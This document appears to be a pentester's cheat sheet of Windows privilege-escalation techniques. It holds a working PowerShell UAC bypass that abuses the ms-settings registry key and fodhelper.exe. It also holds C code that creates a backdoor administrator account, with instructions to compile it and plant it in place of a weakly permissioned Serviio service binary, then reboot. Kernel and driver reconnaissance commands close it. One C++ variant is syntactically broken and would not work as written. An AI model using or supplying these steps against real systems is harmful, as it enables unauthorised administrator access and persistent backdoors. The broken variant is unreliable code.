## Privesc Examples

### User Account Control Bypass - FoodHelper
```
function FodhelperBypass(){ 
 
Param (    
 
 [String]$program = "cmd /c start powershell.exe" #default
 
      )
 
#Create registry structure
 
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 
#Perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
#Remove registry structure
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
}
```


### Insecure file permissions - Serviio Example

C code to compile
```
include <stdlib.h>
int main ()
{
      int i;
      i = system ("net user evil Ev!lpass /add");
      i = system ("net localgroup administrators evil /add");
      return 0;
}
```

More accomadating code
```
include <stdlib.h>
#include <bits/stdc++.h>
using namespace std;

char u[] = "evil";
char p[] = "Ev!lpass";
int main ()
{
      int i;
      i = system ("net user ", u, " ", p, " /add");
      i = system ("net localgroup administrators ",  u, " /add");
      return 0; 
}
```

Compile on linux machine
```
sudo apt install -fy gcc-mingw-w64-i686
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

Replace weak permission file with new file
```
set ogfile=C:\Program Files\Serviio\bin\ServiioService.exe
set newogfile=C:\Program Files\Serviio\bin\ServiioService_original.exe
set newfile=adduser.exe

move "%ogfile%" "%newogfile%"
move %newfile% %ogfile%
```

stop service
```
set servicename=Serviio
net stop %servicename%
```

check if running
```
wmic service where caption="%servicename%" get name, caption, state,startmode
```

if is, try and reboot machine. see if we have priv to do so
```
whoami /priv
```

if SeShutdownPrivilege is simply present (can be disabled/enabled) then reboot machine
```
shutdown /r /t 0
```

check if new admin user
```
net localgroup Administrators
```


### Unquoted Service Paths


### Windows Kernel Vulnerabilities

look for vulnerable kernel/driver versions
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
driverquery /v
```